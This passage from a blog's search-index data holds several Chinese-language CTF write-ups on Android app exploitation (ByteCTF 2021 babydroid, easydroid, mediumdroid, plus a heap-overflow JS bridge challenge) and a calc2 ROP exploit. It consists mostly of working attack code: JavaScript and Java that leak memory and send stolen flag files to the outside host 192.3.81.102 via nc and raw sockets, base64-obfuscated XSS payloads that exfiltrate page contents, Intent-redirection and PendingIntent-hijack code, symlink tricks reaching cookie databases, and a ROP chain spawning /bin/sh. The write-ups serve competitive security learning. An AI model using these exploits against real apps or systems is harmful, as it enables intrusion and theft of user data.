= new XMLHttpRequest();        function stringToHex(str) &#123;           var val=&quot;&quot;;           for(var i = 0; i &lt; str.length; i++)&#123;              val += str.charCodeAt(i).toString(16);           &#125;           return val;       &#125;       var sleep = function(time) &#123;         var startTime = new Date().getTime() + parseInt(time, 10);          while(new Date().getTime() &lt; startTime) &#123;&#125;       &#125;;       function log(info) &#123;          xhr.open(&#x27;GET&#x27;, &#x27;http://192.3.81.102/&#x27; + info, true);          xhr.send();       &#125;         function add(index,size,content,back) &#123;            content = stringToHex(content);            javascript:_jsbridge.call(&quot;add&quot;,&#x27;&#123;&quot;data&quot;:&#123;&quot;idx&quot;:&#x27; + index.toString() + &#x27;,&quot;size&quot;:&#x27; + size.toString() + &#x27;,&quot;content&quot;:&quot;&#x27; + content + &#x27;&quot; &#125;,&quot;cbName&quot;:&quot;&#x27; + back + &#x27;&quot; &#125;&#x27;);       &#125;       function edit(index,size,content,back) &#123;            content = stringToHex(content);            javascript:_jsbridge.call(&quot;edit&quot;,&#x27;&#123;&quot;data&quot;:&#123;&quot;idx&quot;:&#x27; + index.toString() + &#x27;,&quot;size&quot;:&#x27; + size.toString() + &#x27;,&quot;content&quot;:&quot;&#x27; + content + &#x27;&quot; &#125;,&quot;cbName&quot;:&quot;&#x27; + back + &#x27;&quot; &#125;&#x27;);       &#125;       function edit2(index,size,content,back) &#123;            javascript:_jsbridge.call(&quot;edit&quot;,&#x27;&#123;&quot;data&quot;:&#123;&quot;idx&quot;:&#x27; + index.toString() + &#x27;,&quot;size&quot;:&#x27; + size.toString() + &#x27;,&quot;content&quot;:&quot;&#x27; + content + &#x27;&quot; &#125;,&quot;cbName&quot;:&quot;&#x27; + back + &#x27;&quot; &#125;&#x27;);            sleep(5000);       &#125;         function del(index,back) &#123;            javascript:_jsbridge.call(&quot;free&quot;,&#x27;&#123;&quot;data&quot;:&#123;&quot;idx&quot;:&#x27; + index.toString() + &#x27; &#125;,&quot;cbName&quot;:&quot;&#x27; + back + &#x27;&quot; &#125;&#x27;);            sleep(5000);       &#125;       function show(index,back) &#123;            javascript:_jsbridge.call(&quot;show&quot;,&#x27;&#123;&quot;data&quot;:&#123;&quot;idx&quot;:&#x27; + index.toString() + &#x27; &#125;,&quot;cbName&quot;:&quot;&#x27; + back + &#x27;&quot; &#125;&#x27;);       &#125;       function getPadding(size,c) &#123;            var ans = &#x27;&#x27;;            for (var i=0;i&lt;size;i++) &#123;               ans += c;            &#125;            return ans;       &#125;       var heap_addr=null;       var elf_base=null;       function common_back(data) &#123;       &#125;         function p32(value) &#123;          var t = value.toString(16);          while (t.length != 8) &#123;             t = t + &#x27;0&#x27;;          &#125;          var ans = t.substr(6,2) + t.substr(4,2) + t.substr(2,2) + t.substr(0,2);          //alert(ans);          return ans;       &#125;         //start       add(0,0x8,getPadding(0x8,&#x27;a&#x27;),&quot;back0&quot;);         function back0(data) &#123;          sleep(5000);          add(1,0x8,getPadding(0x8,&#x27;b&#x27;),&quot;back1&quot;);       &#125;       function back1(data) &#123;          sleep(5000);          add(2,0x8,getPadding(0x8,&#x27;c&#x27;),&quot;back2&quot;);       &#125;       function back2(data) &#123;          sleep(5000);          add(3,0x8,getPadding(0x20,&#x27;d&#x27;),&quot;back3&quot;);       &#125;       function back3(data) &#123;          sleep(5000);          edit(2,0x18,getPadding(0x18,&#x27;c&#x27;),&quot;back4&quot;);;       &#125;         function back4(data) &#123;          sleep(5000);          show(2,&quot;back5&quot;);       &#125;         function back5(data) &#123;          sleep(5000);          data = data[&#x27;msg&#x27;];          heap_addr = parseInt(data.substr(54,2) + data.substr(52,2) + data.substr(50,2) + data.substr(48,2),16);          handlePc_addr = parseInt(data.substr(62,2) + data.substr(60,2) + data.substr(58,2) + data.substr(56,2),16);          elf_base = handlePc_addr - 0xbf0;          memset_got = elf_base + 0x2FDC;          edit2(2,0x1C,stringToHex(getPadding(0x18,&#x27;c&#x27;))+p32(memset_got),&quot;back6&quot;);          //alert(&quot;heap_addr=&quot;+heap_addr.toString(16) + &quot;handlePc_addr=&quot; + handlePc_addr.toString(16));         &#125;         function back6(data) &#123;          sleep(5000);          show(3,&quot;back7&quot;);       &#125;         function back7(data) &#123;          sleep(5000);          data = data[&#x27;msg&#x27;];          memset_addr = parseInt(data.substr(6,2) + data.substr(4,2) + data.substr(2,2) + data.substr(0,2),16);          libc_base = memset_addr - 0x19b30;          system_addr = libc_base + 0x72b60;          log(&quot;libc_base=&quot; + libc_base.toString(16) + &quot; system_addr=&quot; + system_addr.toString(16));          edit2(2,0x20,stringToHex(getPadding(0x18,&#x27;c&#x27;))+p32(heap_addr) + p32(system_addr),&quot;back8&quot;)       &#125;       function back8(data) &#123;          sleep(5000);          var cmd = &quot;nc 192.3.81.102 6666 &lt; /data/local/tmp/flag;&quot;;          edit(3,cmd.length,cmd,&quot;back9&quot;);       &#125;         function back9(data) &#123;          sleep(5000);          //alert(&quot;ready to go!&quot;);          show(3,&quot;back10&quot;);       &#125;      &lt;/script&gt;&lt;/head&gt;  &lt;body&gt;  &lt;div&gt;haivk&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;","categories":["CTF"],"tags":["堆溢出","android"]},{"title":"bytectf2021_babydroid","url":"/2021/10/17/bytectf2021-babydroid/","content":"存在Intent重定向漏洞\n\n\nMainActivity.java\npackage com.bytectf.pwnbabydroid;import android.app.Activity;import android.content.ContentValues;import android.content.Intent;import android.net.Uri;import android.os.Bundle;import android.provider.MediaStore;import android.widget.Toast;import java.io.ByteArrayOutputStream;import java.io.InputStream;public class MainActivity extends Activity &#123;    @Override    protected void onCreate(Bundle savedInstanceState) &#123;        super.onCreate(savedInstanceState);        Intent extra = new Intent();        extra.setFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION | Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);        extra.setClassName(getPackageName(), &quot;com.bytectf.pwnbabydroid.FlagHunter&quot;); extra.setData(Uri.parse(&quot;content://androidx.core.content.FileProvider/&quot;));        Intent intent = new Intent();        intent.setClassName(&quot;com.bytectf.babydroid&quot;, &quot;com.bytectf.babydroid.Vulnerable&quot;);        intent.putExtra(&quot;intent&quot;, extra);        intent.setAction(&quot;com.bytectf.TEST&quot;);        startActivity(intent);    &#125;&#125;\n\nFlagHunter.java\npackage com.bytectf.pwnbabydroid;import android.app.Activity;import android.net.Uri;import android.os.Bundle;import android.util.Log;import android.widget.TextView;import android.widget.Toast;import java.io.BufferedReader;import java.io.InputStream;import java.io.InputStreamReader;import java.io.OutputStream;import java.net.InetSocketAddress;import java.net.Socket;import java.net.SocketAddress;public class FlagHunter extends Activity &#123;    @Override    public void onCreate(Bundle bundle) &#123;        super.onCreate(bundle);        try &#123;            String file = &quot;/root/data/data/com.bytectf.babydroid/files/flag&quot;;            InputStream is = getContentResolver().openInputStream(Uri.parse(getIntent().getDataString() + file));            BufferedReader br = new BufferedReader(new InputStreamReader(is));            StringBuilder sb = new StringBuilder();            String line;            while ((line = br.readLine()) != null) &#123;                sb.append(line);            &#125;            is.close();            br.close();            String flag = sb.toString();            Log.e(&quot;FlagHunter&quot;, flag);            new Thread(new Runnable() &#123;                @Override                public void run() &#123;                    try &#123;                        if (true) &#123;                            Socket sk = new Socket();                            SocketAddress address = new InetSocketAddress(&quot;192.3.81.102&quot;, 6666);                            sk.connect(address, 5000);                            sk.setTcpNoDelay(true);                            sk.setKeepAlive(true);                            OutputStream os = sk.getOutputStream();                            os.write(flag.getBytes());                            os.flush();                            os.close();                            sk.close();                            Thread.sleep(1000);                        &#125;                    &#125; catch (Exception e) &#123;                        Log.e(&quot;FlagHunter_Err&quot;,e.toString());                    &#125;                &#125;            &#125;).start();            //os.close();        &#125; catch (Exception e) &#123;            Log.e(&quot;FlagHunter_Err&quot;,e.toString());        &#125;    &#125;&#125;\nAndroidManifest.xml\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;    package=&quot;com.bytectf.pwnbabydroid&quot;&gt;    &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt;    &lt;application        android:allowBackup=&quot;true&quot;        android:icon=&quot;@mipmap/ic_launcher&quot;        android:label=&quot;@string/app_name&quot;        android:roundIcon=&quot;@mipmap/ic_launcher_round&quot;        android:supportsRtl=&quot;true&quot; &gt;        &lt;activity            android:name=&quot;.MainActivity&quot;            android:exported=&quot;true&quot;            android:label=&quot;@string/title_activity_main&quot;&gt;            &lt;intent-filter&gt;                &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;            &lt;/intent-filter&gt;        &lt;/activity&gt;        &lt;activity android:name=&quot;com.bytectf.pwnbabydroid.FlagHunter&quot; android:exported=&quot;true&quot; /&gt;    &lt;/application&gt;&lt;/manifest&gt;\n\n","categories":["CTF"],"tags":["android"]},{"title":"bytectf2021_easydroid","url":"/2021/10/17/bytectf2021-easydroid/","content":"url校验不充分，我们注册了ha1vktoutiao.com，并绑定了自己的服务器，实现了校验的绕过\n\nTestActivity中的WebView允许执行JS，而Flag存储在Cookie数据库里\n\n利用软连接创建一个symlink.html指向Cookies数据库，然后在加载我们自己的网页时注入一个XSS到Cookie中MainActivity.java\npackage com.bytectf.pwneasydroid;import android.annotation.SuppressLint;import android.app.Activity;import android.content.Intent;import android.net.Uri;import android.os.Bundle;import android.os.Handler;import android.util.Log;import android.webkit.WebView;import android.webkit.WebViewClient;import android.widget.EditText;import android.widget.Toast;import java.net.URISyntaxException;public class MainActivity extends Activity &#123;    //EditText ed;    @Override    protected void onCreate(Bundle savedInstanceState) &#123;        super.onCreate(savedInstanceState);        //ed = new EditText(this);        //setContentView(ed);        //launch(&quot;file://&quot; + symlink());        symlink();        Intent i = new Intent();        i.setClassName(&quot;com.bytectf.easydroid&quot;,&quot;com.bytectf.easydroid.MainActivity&quot;);        i.setData(Uri.parse(&quot;http://www.ha1vktoutiao.com&quot;));        new Handler().postDelayed(() -&gt; startActivity(i),5000);    &#125;    private void launch(String url) &#123;        Uri uri = Uri.parse(&quot;http://192.3.81.102#toutiao.com/&quot;);        Intent i = new Intent();        i.setClassName(&quot;com.bytectf.easydroid&quot;,&quot;com.bytectf.easydroid.TestActivity&quot;);        i.putExtra(&quot;url&quot;,url);        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);        String url_str = i.toUri(Intent.URI_INTENT_SCHEME);        //ed.setText(url_str);    &#125;    private String symlink() &#123;        try &#123;            String root = getApplicationInfo().dataDir;            String symlink = root + &quot;/symlink.html&quot;;            String cookies = &quot;/data/data/com.bytectf.easydroid/app_webview/Cookies&quot;;            Runtime.getRuntime().exec(&quot;rm &quot; + symlink).waitFor();            Runtime.getRuntime().exec(&quot;ln -s &quot; + cookies + &quot; &quot; + symlink).waitFor();            Runtime.getRuntime().exec(&quot;chmod -R 777 &quot; + root).waitFor();            return symlink;        &#125; catch (Exception e) &#123;            throw new RuntimeException(e);        &#125;    &#125;&#125;\nAndroidManifest.xml\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;    package=&quot;com.bytectf.pwneasydroid&quot; &gt;    &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt;    &lt;application        android:allowBackup=&quot;true&quot;        android:icon=&quot;@mipmap/ic_launcher&quot;        android:label=&quot;@string/app_name&quot;        android:roundIcon=&quot;@mipmap/ic_launcher_round&quot;        android:usesCleartextTraffic=&quot;true&quot;        android:supportsRtl=&quot;true&quot; &gt;        &lt;activity            android:name=&quot;.MainActivity&quot;            android:exported=&quot;true&quot; &gt;            &lt;intent-filter&gt;                &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;            &lt;/intent-filter&gt;        &lt;/activity&gt;    &lt;/application&gt;&lt;/manifest&gt;\n服务器端的index.html\n&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;PWN&lt;/title&gt;&lt;script&gt;document.cookie = &quot;x = &#x27;&lt;img src=\\&quot;x\\&quot; onerror=\\&quot;eval(decodeURI(atob(&#x27;bmV3JTIwSW1hZ2UoKS5zcmMlMjA9JTIwJTIyaHR0cDovLzE5Mi4zLjgxLjEwMi8/Y29va2llPSUyMiUyMCslMjB3aW5kb3cuYnRvYShlbmNvZGVVUkkoZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJTIyaHRtbCUyMiklNUIwJTVELmlubmVySFRNTCkpOw==&#x27;)))\\&quot;&gt;&#x27;&quot;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;script&gt;function getflag() &#123;   window.location = &quot;intent:#Intent;launchFlags=0x10008000;component=com.bytectf.easydroid/.TestActivity;S.url=file%3A%2F%2F%2Fdata%2Fuser%2F0%2Fcom.bytectf.pwneasydroid%2Fsymlink.html;end&quot;;&#125;setTimeout(&quot;getflag()&quot;,25000);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n","categories":["CTF"],"tags":["android"]},{"title":"bytectf2021_mediumdroid","url":"/2021/10/17/bytectf2021-mediumdroid/","content":"PendingIntent使用了空的Intent，因此我们可以在其他APP中劫持PendingIntent，任意修改Intent的action，实现广播\n\n与easydroid的思路类似，我们利用PendingIntent发送com.bytectf.SET_FLAG的广播，目的是在flag文件中注入一段XSS，然后利用软连接建立一个symlink.html，并加载，实现将整个flag文件反弹MainActivity.java\npackage com.bytectf.pwnmediumdroid;import android.app.Activity;import android.app.PendingIntent;import android.content.Intent;import android.net.Uri;import android.os.Bundle;import android.util.Log;import android.widget.EditText;public class MainActivity extends Activity &#123;    EditText ed;    @Override    protected void onCreate(Bundle savedInstanceState) &#123;        super.onCreate(savedInstanceState);        /*ed = new EditText(this);        setContentView(ed);        launch(&quot;a&quot;);*/        symlink();        HijackNotification();        Intent i = new Intent();        i.setClassName(&quot;com.bytectf.mediumdroid&quot;,&quot;com.bytectf.mediumdroid.MainActivity&quot;);        i.setData(Uri.parse(&quot;http://www.ha1vktoutiao.com&quot;));        startActivity(i);    &#125;    private void HijackNotification() &#123;        Thread t = new Thread(new Runnable() &#123;            @Override            public void run() &#123;                while (MagicService.sbn == null) &#123;                    try &#123;                        Thread.sleep(10);                    &#125; catch (InterruptedException e) &#123;                        e.printStackTrace();                    &#125;                &#125;                runOnUiThread(new Runnable() &#123;                    @Override                    public void run() &#123;                        //获取程序的PendingIntent                        PendingIntent pendingIntent = MagicService.sbn.getNotification().contentIntent;                        Intent vunlnIntent = new Intent(&quot;com.bytectf.SET_FLAG&quot;);                        vunlnIntent.setPackage(&quot;com.bytectf.mediumdroid&quot;);                        vunlnIntent.putExtra(&quot;flag&quot;,&quot;x = &#x27;&lt;img src=\\&quot;x\\&quot; onerror=\\&quot;eval(decodeURI(atob(&#x27;bmV3JTIwSW1hZ2UoKS5zcmMlMjA9JTIwJTIyaHR0cDovLzE5Mi4zLjgxLjEwMi8/Y29va2llPSUyMiUyMCslMjB3aW5kb3cuYnRvYShlbmNvZGVVUkkoZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJTIyaHRtbCUyMiklNUIwJTVELmlubmVySFRNTCkpOw==&#x27;)))\\&quot;&gt;&#x27;&quot;);                        Log.e(&quot;PendingIntent&quot;,&quot;okok&quot;);                        try &#123;                            pendingIntent.send(MainActivity.this,0,vunlnIntent);                            //sendBroadcast(vunlnIntent);                            Log.e(&quot;PendingIntent&quot;,&quot;finish&quot;);                        &#125; catch (Exception e) &#123;                            Log.e(&quot;PendingIntent&quot;,e.toString());                            e.printStackTrace();                        &#125;                        Intent i = new Intent();                        i.setClassName(&quot;com.bytectf.mediumdroid&quot;,&quot;com.bytectf.mediumdroid.MainActivity&quot;);                        i.setData(Uri.parse(&quot;http://www.ha1vktoutiao.com/stage2.html&quot;));                        startActivity(i);                    &#125;                &#125;);            &#125;        &#125;);        t.start();    &#125;    private String symlink() &#123;        try &#123;            String root = getApplicationInfo().dataDir;            String symlink = root + &quot;/symlink.html&quot;;            String flag = &quot;/data/data/com.bytectf.mediumdroid/files/flag&quot;;            Runtime.getRuntime().exec(&quot;rm &quot; + symlink).waitFor();            Runtime.getRuntime().exec(&quot;ln -s &quot; + flag + &quot; &quot; + symlink).waitFor();            Runtime.getRuntime().exec(&quot;chmod -R 777 &quot; + root).waitFor();            return symlink;        &#125; catch (Exception e) &#123;            throw new RuntimeException(e);        &#125;    &#125;    private void launch(String url) &#123;        Intent extra = new Intent();        extra.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);        extra.setClassName(&quot;com.bytectf.mediumdroid&quot;, &quot;com.bytectf.mediumdroid.TestActivity&quot;);        extra.putExtra(&quot;url&quot;,&quot;http://www.ha1vktoutiao.com/notify.html&quot;);        String url_str = extra.toUri(Intent.URI_INTENT_SCHEME);        ed.setText(url_str);    &#125;&#125;\nMagicService.java\npackage com.bytectf.pwnmediumdroid;import android.app.Notification;import android.os.Bundle;import android.service.notification.NotificationListenerService;import android.service.notification.StatusBarNotification;import android.util.Log;public class MagicService extends NotificationListenerService &#123;    public static StatusBarNotification sbn = null;    @Override    public void onNotificationPosted(StatusBarNotification sbn) &#123;        if (this.sbn == null) &#123;            Bundle extras = sbn.getNotification().extras;            // 获取接收消息APP的包名            String notificationPkg = sbn.getPackageName();            // 获取接收消息的抬头            String notificationTitle = extras.getString(Notification.EXTRA_TITLE);            // 获取接收消息的内容            String notificationText = extras.getString(Notification.EXTRA_TEXT);            if (notificationTitle != null &amp;&amp; notificationText != null &amp;&amp; notificationTitle.equals(&quot;PWN&quot;) &amp;&amp; notificationText.equals(&quot;ha1vk&quot;)) &#123;                this.sbn = sbn;                Log.i(&quot;NotificationMonitor&quot;, &quot;Notification posted&quot;);            &#125;        &#125;    &#125;    @Override    public void onNotificationRemoved(StatusBarNotification sbn) &#123;        Log.i(&quot;NotificationMonitor&quot;,&quot;Notification removed&quot;);    &#125;&#125;\nAndroidManifest.xml\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;    package=&quot;com.bytectf.pwnmediumdroid&quot;&gt;    &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt;    &lt;application        android:allowBackup=&quot;true&quot;        android:icon=&quot;@mipmap/ic_launcher&quot;        android:label=&quot;@string/app_name&quot;        android:roundIcon=&quot;@mipmap/ic_launcher_round&quot;        android:supportsRtl=&quot;true&quot;&gt;        &lt;activity            android:name=&quot;.MainActivity&quot;            android:exported=&quot;true&quot;&gt;            &lt;intent-filter&gt;                &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;            &lt;/intent-filter&gt;        &lt;/activity&gt;        &lt;service android:name=&quot;.MagicService&quot;            android:label=&quot;@string/service_name&quot;            android:permission=&quot;android.permission.BIND_NOTIFICATION_LISTENER_SERVICE&quot;&gt;            &lt;intent-filter&gt;                &lt;action android:name=&quot;android.service.notification.NotificationListenerService&quot; /&gt;            &lt;/intent-filter&gt;        &lt;/service&gt;    &lt;/application&gt;&lt;/manifest&gt;\n服务器上的index.html\n&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;PWN&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script&gt;function getflag() &#123;   window.location = &quot;intent:#Intent;launchFlags=0x10008000;component=com.bytectf.mediumdroid/.TestActivity;S.url=http%3A%2F%2Fwww.ha1vktoutiao.com%2Fnotify.html;end&quot;;&#125;setTimeout(&quot;getflag()&quot;,5000);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\nnotify.html打开通知\n&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;NOTIFY&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script&gt;jsi.Te3t(&quot;PWN&quot;,&quot;ha1vk&quot;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\nstage2.html\n&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;STAGE2&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script&gt;function getflag() &#123;   window.location = &quot;intent:#Intent;launchFlags=0x10008000;component=com.bytectf.mediumdroid/.TestActivity;S.url=file%3A%2F%2F%2Fdata%2Fuser%2F0%2Fcom.bytectf.pwnmediumdroid%2Fsymlink.html;end&quot;;&#125;setTimeout(&quot;getflag()&quot;,10000);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\n","categories":["CTF"],"tags":["android"]},{"title":"calc2","url":"/2019/12/12/calc2_calc/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，发现libc被静态编译进了程序中，又由于**[没有开启PIE,，所以，我们就直接可以获得需要的函数的地址]{.mark}。然而，我们发现，system、execve这些函数都没有，有没有one_gadget，那么我们只能[通过系统调用来构造ROP执行&#x2F;bin&#x2F;sh来getshell]{.mark}**\n\n\n发现，该程序是一个四则运算表达式计算程序\n\n\n其中，我们需要重点关注的就是a2[v4+1] &#x3D; v9这句代码，可能造成下标越界。\n我们仔细分析程序，然后用C语言还原这个计算过程\n#include &lt;stdio.h&gt;  #include &lt;string.h&gt;  #include &lt;stdlib.h&gt;    //栈  struct Stack &#123;      int top;      int data[100];  &#125;;      void eval(Stack *num_stack,char op) &#123;      switch (op) &#123;          case &#x27;+&#x27;:              num_stack-&gt;data[num_stack-&gt;top - 1] += num_stack-&gt;data[num_stack-&gt;top];              break;          case &#x27;-&#x27;:              num_stack-&gt;data[num_stack-&gt;top - 1] -= num_stack-&gt;data[num_stack-&gt;top];              break;          case &#x27;*&#x27;:              num_stack-&gt;data[num_stack-&gt;top - 1] *= num_stack-&gt;data[num_stack-&gt;top];              break;          case &#x27;/&#x27;:              num_stack-&gt;data[num_stack-&gt;top - 1] /= num_stack-&gt;data[num_stack-&gt;top];              break;      &#125;      //出栈一个无用数据      num_stack-&gt;top--;  &#125;    int parse_expr(char *in,Stack *num_stack) &#123;      //存放运算符的栈      Stack op_stack;      memset(&amp;op_stack,0,sizeof(Stack));      char *p = in;      for (int i=0;; ++i) &#123;          char ch = in[i];          //遇到非数字，判定为运算符          if ( unsigned(ch - &#x27;0&#x27;) &gt; 9) &#123;              int len = i + in - p;              char *tmp = (char *)malloc(len+1);              memcpy(tmp,p,len);              tmp[len] = &#x27;\\0&#x27;;              if ( !strcmp(tmp, &quot;0&quot;) ) &#123;                  puts(&quot;prevent division by zero&quot;);                  fflush(stdout);                  return 0;              &#125;              int x = atoi(tmp);              //操作数入栈              if (x &gt; 0) &#123;                  num_stack-&gt;top++;                  num_stack-&gt;data[num_stack-&gt;top] = x;              &#125;                //表达式错误，不能有连续的多个运算符              if (ch &amp;&amp; in[i+1] - &#x27;0&#x27; &gt; 9) &#123;                  puts(&quot;expression error!&quot;);                  fflush(stdout);                  return 0;              &#125;              p = in + i + 1;              //查看栈顶运算符              char op =  op_stack.data[op_stack.top];              if (op) &#123;                  //与当前运算符做比较                  switch (ch) &#123;                      case &#x27;%&#x27;:                      case &#x27;*&#x27;:                      case &#x27;/&#x27;:                          if ( op != &#x27;+&#x27; &amp;&amp; op != &#x27;-&#x27; ) &#123;                              eval(num_stack, op);                              op_stack.data[op_stack.top] = ch;                          &#125; else &#123;                              op_stack.data[++op_stack.top] = ch;                          &#125;                          break;                      case &#x27;+&#x27;:                      case &#x27;-&#x27;:                          eval(num_stack, op);                          op_stack.data[op_stack.top] = ch;                          break;                      default:                          eval(num_stack, op_stack.data[op_stack.top--]);                          break;                  &#125;              &#125; else &#123;                  op_stack.data[op_stack.top] = ch;              &#125;              if (!ch) &#123;                  break;              &#125;          &#125;      &#125;      while (op_stack.top &gt;= 0) &#123;          eval(num_stack, op_stack.data[op_stack.top--]);      &#125;      return 1;  &#125;    int main() &#123;      //存放操作数的栈      Stack num_stack;      num_stack.top = -1;      memset(num_stack.data,0,sizeof(int) * 100);      char expr[0x400] = &#123;0&#125;;      while (true) &#123;          scanf(&quot;%s&quot;,expr);          if (parse_expr(expr,&amp;num_stack)) &#123;              printf(&quot;%d\\n&quot;,num_stack.data[num_stack.top]);              fflush(stdout);          &#125;      &#125;  &#125;  \n\n再对比IDA，中，[我们要是能修改到a2，也就是top指针，那么就能实现任意地址写]{.mark}\n\n\n再看看这个程序的逻辑，结合我们还原的源代码，[能够修改到top的值的关键地方在eval函数]{.mark}\n\n\n结合源代码，我们看看\n\n\n如果当**[num_stack-&gt;top为0时，就可以造成data数据下标越界]{.mark}，什么时候num_stack-&gt;top为0呢？不就是num_stack里只有一个操作数的时候吗。如果，我们输入的表达式为+123，那么,由于该程序判断时的缺陷，表达式的结尾的0也被当做符号处理，因此，程序先是遇到+号,+号入运算符栈，然后程序遇到123，入num_stack，接下来，程序遇到0结尾符，于是会调用eval函数，而此时num_stack-&gt;top &#x3D; 0,导致了num_stack-&gt;data[-1] +&#x3D; num_stack[num_stack-&gt;top]，使得num_stack的top变成了123 + 1 &#x3D; 124，接下来，结尾处又执行了，综上,[+123这个表达式使得num_stack的top变成了123]{.mark}**。为了便于观察，我们可以加入这样的代码\n\n\n然后，我们输入+123+456\n\n\n由此，我们可以用IDA调试，[找到calc函数的返回地址的栈位置，便可以修改calc的返回地址，构造ROP链]{.mark}。为了构造ROP，我们需要一些gadget，我们可以使用ROPgadgets工具来查找ROPgadget –binary calc2 –only ‘pop|ret’ | grep ‘eax’\n#pop eax ; ret  pop_eax = 0x0805c34b  #pop ebx ; ret  pop_ebx = 0x080481d1  #pop ecx ; pop ebx ; ret  pop_ecx = 0x080701d1  #pop edx ; ret  pop_edx = 0x080701aa  #int 0x80  int_80 = 0x08049a21    #通过系统调用来执行/bin/sh  rop = [pop_eax,0x0b,         pop_ecx,0,0,         pop_edx,0,         int_80,         u32(&#x27;/bin&#x27;),         u32(&#x27;/sh\\x00&#x27;)]  \n\n为了得到&#x2F;bin&#x2F;sh字符串的地址，我们把&#x2F;bin&#x2F;sh到时候存到栈里，然后，我们需要泄露一些栈地址，就能得到&#x2F;bin&#x2F;sh字符串地址\n我们可以借助输出结果的地方来泄露地址\n\n\n其中,[v1正是num_stack的栈顶指针,v2是num_stack的数据区]{.mark}\n之前我们知道了,+123，可以使得num_stack的栈顶指针变为123，那么就能泄露偏移123*4字节处的数据，那么要泄露栈地址，我们只需算出main的ebp的偏移，即可泄露\n我们看到,当前存放main的ebp的栈地址为0xFFFEA1C8\n\n\n而v2的地址为0xFFFE9C2C，计算一下**[(0xFFFEA1C8 - 0xFFFE9C2C) &#x2F; 4 &#x3D; 0x167]{.mark}**\n也就是359，因此，我们**[只需要输入+360再回车，即可泄露出main函数的ebp]{.mark}，然后，就能计算出&#x2F;bin&#x2F;sh字符串在栈里的地址，需要注意的是，[泄露出来的数据是负数，因为%d处理的是有符号数，因此，我们只需用0x100000000 + x即可得到原来的数据]{.mark}**\nsh.recvuntil(&#x27;\\n&#x27;)  #泄露main的ebp  sh.sendline(&#x27;+360&#x27;)  #由于泄露出来是一个负数的形式，因此我们将其加上0x100000000即可  main_ebp = int(sh.recvuntil(&#x27;\\n&#x27;,drop=True))  main_ebp = 0x100000000 + main_ebp  #获得/bin/sh字符串在栈里的位置  rop[4] = main_ebp - 0x20 + 9 * 4  print hex(main_ebp)  \n\n现在，我们得到了地址，然后就构造好了ROP链，我们需要依次把ROP链写入到calc的返回地址的栈后面\n经过一顿测试，发现，[我们不能靠这里来写ROP,因为后续用调用了eval函数，对数据又做了修改吗，因此，我们应该依靠eval函数]{.mark}，因为eval函数里对a1数组做了最后的修改。\n\n\neval函数\n\n\n由于是**[a1[top-1] +&#x3D; a1[top]]{.mark}**，因此，本来，我们走360开始就是calc函数的返回地址处，我们向后偏移1，也就是从361开始，这样，不会影响前面的canary值。并且，由于使用的是+&#x3D;，我们需要先泄露原来a1[top]处的数据，再算出差值，然后提交\n#开始写360处就是parse_expr的返回地址，我们写ROP  for i in range(0,len(rop)):     payload = &#x27;+&#x27; + str(361 + i)     sh.sendline(payload)     #先泄露原来的值     num = int(sh.recvuntil(&#x27;\\n&#x27;,drop=True))     #计算出差值     offset = rop[i] - num     print hex(rop[i])     #如果小于零，我们需要去掉+号，直接使用数字前面的负号     if offset&lt;0:        payload_ = payload + str(offset)     else:        payload_ = payload + &#x27;+&#x27; + str(offset)     #发送数据     sh.sendline(payload_)     #我们还需检验一下是否正确的写入了对的数据     value = int(sh.recv(1024))     if value &lt; 0:        #转为原始数据        value += 0x100000000     while value!=rop[i]:        print &quot;current value is %x&quot; % (value)        offset = rop[i] - value        if offset&lt;0:           sh.sendline(payload + str(offset))        else:           sh.sendline(payload + &#x27;+&#x27; + str(offset))        value = int(sh.recv(1024))        if value &lt; 0:           value += 0x100000000  \n\n这样操作以后，ROP写入成功，接下来，我们发送一个非数字和运算符，使得程序退出calc函数，执行ROP链。\n#getshell  sh.sendline(&#x27;a&#x27;)  \n\n本题的难点在于找到漏洞，以及分析漏洞，需要一定的时间。\n综上，我们的exp脚本如下\n#coding:utf8  from 